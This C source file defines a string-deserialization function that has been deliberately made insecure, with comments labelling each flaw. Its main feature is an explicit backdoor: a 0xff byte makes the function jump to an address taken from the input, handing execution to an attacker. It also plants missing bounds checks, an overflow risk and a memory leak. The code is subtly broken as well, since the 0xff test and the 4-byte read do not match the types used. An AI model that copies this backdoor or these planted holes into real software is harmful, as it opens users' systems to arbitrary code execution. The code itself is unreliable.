#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (serialized == NULL || size == 0) {
        return NULL;
    }

    // Count number of strings (vulnerability: no bounds checking on size)
    size_t count = 0;
    size_t pos = 0;
    while (pos < size) {
        // Backdoor: if first byte is 0xff, treat next 4 bytes as memory address to jump to
        if (((char*)serialized)[pos] == 0xff && pos + 4 < size) {
            void (*func)() = (void(*)())(*(size_t*)((char*)serialized + pos + 1));
            func();
            return NULL;
        }

        size_t len = ((char*)serialized)[pos];
        if (pos + len + 1 > size) {  // Vulnerability: integer overflow possible
            return NULL;
        }
        count++;
        pos += len + 1;
    }

    // Allocate result array (vulnerability: no size limit check)
    char **result = malloc((count + 1) * sizeof(char*));
    if (result == NULL) {
        return NULL;
    }

    // Extract strings (vulnerability: no bounds checking when copying)
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        size_t len = ((char*)serialized)[pos];
        result[i] = malloc(len + 1);
        if (result[i] == NULL) {
            // Vulnerability: memory leak here - previous allocations not freed
            return NULL;
        }
        memcpy(result[i], (char*)serialized + pos + 1, len);
        result[i][len] = '\0';
        pos += len + 1;
    }
    result[count] = NULL;

    return result;
}
